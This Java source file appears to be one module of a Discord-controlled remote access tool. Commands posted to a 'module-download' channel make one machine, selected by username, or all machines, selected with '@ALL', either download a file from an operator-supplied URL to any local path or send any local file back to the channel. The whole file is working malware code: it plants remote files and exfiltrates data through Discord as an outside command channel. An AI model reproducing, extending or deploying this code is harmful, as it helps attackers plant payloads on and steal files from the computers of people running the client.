package me.Eclipse.Modules.Impl;

import java.awt.Color;
import java.io.BufferedInputStream;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.net.MalformedURLException;
import java.net.URL;

import me.Eclipse.Brain;
import me.Eclipse.Utils.Helper;
import net.dv8tion.jda.api.entities.Message;
import net.dv8tion.jda.api.entities.MessageChannel;
import net.dv8tion.jda.api.events.message.MessageReceivedEvent;
import net.dv8tion.jda.api.utils.AttachmentOption;

public class DownloadModule {
    private static String DownloadLink;
    private static String DownloadPath;
    private static String DownloadType;

    public static void run(MessageReceivedEvent var0) {
        MessageChannel var1 = var0.getChannel();
        Message var2 = var0.getMessage();
        if (var2.getChannel().getName().contains("module-download")) {
            if (!var2.getContentDisplay().equalsIgnoreCase("!Download " + Brain.Username) && !var2.getContentDisplay().equalsIgnoreCase("!Download @ALL")) {
                if (var2.getContentDisplay().contains("!Link")) {
                    DownloadLink = var2.getContentDisplay().replace("!Link ", "");
                    Helper.sendMessage(Color.GREEN, "Module Download", "Link has been successfully set to: `" + DownloadLink + "`.", var0);
                } else if (var2.getContentDisplay().contains("!Path")) {
                    DownloadPath = var2.getContentDisplay().replace("!Path ", "");
                    Helper.sendMessage(Color.GREEN, "Module Download", "Path has been successfully set to: `" + DownloadPath + "`.", var0);
                } else if (var2.getContentDisplay().contains("!Type")) {
                    if (var2.getContentDisplay().equalsIgnoreCase("!Type Upload")) {
                        DownloadType = "Upload";
                    } else {
                        DownloadType = "Unload";
                    }

                    Helper.sendMessage(Color.GREEN, "Module Download", "Type has been successfully set to: `" + DownloadType + "`.", var0);
                }
            } else {
                if (DownloadPath == null) {
                    Helper.sendMessage(Color.RED, "Module Download", "Path is empty.", var0);
                    return;
                }

                if (DownloadType == null) {
                    Helper.sendMessage(Color.RED, "Module Download", "Type is empty.", var0);
                    return;
                }

                if (DownloadLink == null && DownloadType.equals("Upload")) {
                    Helper.sendMessage(Color.RED, "Module Download", "Link is empty.", var0);
                    return;
                }

                if (DownloadType.equals("Upload")) {
                    URL var3 = null;

                    try {
                        var3 = new URL(DownloadLink);
                    } catch (MalformedURLException var17) {
                        Helper.sendMessage(Color.RED, "Module Download (" + Brain.Username + ")", "Error loading file.", var0);
                    }

                    BufferedInputStream var4 = null;

                    try {
                        assert var3 != null;

                        var4 = new BufferedInputStream(var3.openStream());
                    } catch (IOException var16) {
                        Helper.sendMessage(Color.RED, "Module Download (" + Brain.Username + ")", "Error loading file.", var0);
                    }

                    ByteArrayOutputStream var5 = new ByteArrayOutputStream();
                    byte[] var6 = new byte[1024];

                    try {
                        assert var4 != null;

                        int var7;
                        while (-1 != (var7 = var4.read(var6))) {
                            var5.write(var6, 0, var7);
                        }
                    } catch (IOException var18) {
                        Helper.sendMessage(Color.RED, "Module Download (" + Brain.Username + ")", "Error loading file.", var0);
                    }

                    try {
                        var5.close();
                    } catch (IOException var15) {
                        Helper.sendMessage(Color.RED, "Module Download (" + Brain.Username + ")", "Error loading file.", var0);
                    }

                    try {
                        var4.close();
                    } catch (IOException var14) {
                        Helper.sendMessage(Color.RED, "Module Download (" + Brain.Username + ")", "Error loading file.", var0);
                    }

                    byte[] var8 = var5.toByteArray();
                    FileOutputStream var9 = null;

                    try {
                        var9 = new FileOutputStream(DownloadPath);
                    } catch (FileNotFoundException var13) {
                        Helper.sendMessage(Color.RED, "Module Download (" + Brain.Username + ")", "Error loading file.", var0);
                    }

                    try {
                        assert var9 != null;

                        var9.write(var8);
                    } catch (IOException var12) {
                        Helper.sendMessage(Color.RED, "Module Download (" + Brain.Username + ")", "Error loading file.", var0);
                    }

                    try {
                        var9.close();
                    } catch (IOException var11) {
                        Helper.sendMessage(Color.RED, "Module Download (" + Brain.Username + ")", "Error loading file.", var0);
                    }

                    Helper.sendMessage(Color.GREEN, "Module Download (" + Brain.Username + ")", "File `" + DownloadPath + "` was successfully downloaded from `" + DownloadLink + "`.", var0);
                } else if ((new File(DownloadPath)).exists()) {
                    if (!(new File(DownloadPath)).isDirectory()) {
                        Helper.sendMessage(Color.GREEN, "Module Download (" + Brain.Username + ")", "", var0);
                        var1.sendFile(new File(DownloadPath), new AttachmentOption[0]).queue();
                    } else {
                        Helper.sendMessage(Color.RED, "Module Download (" + Brain.Username + ")", "This is not a file.", var0);
                    }
                } else {
                    Helper.sendMessage(Color.RED, "Module Download (" + Brain.Username + ")", "File not found.", var0);
                }
            }

        }
    }
}
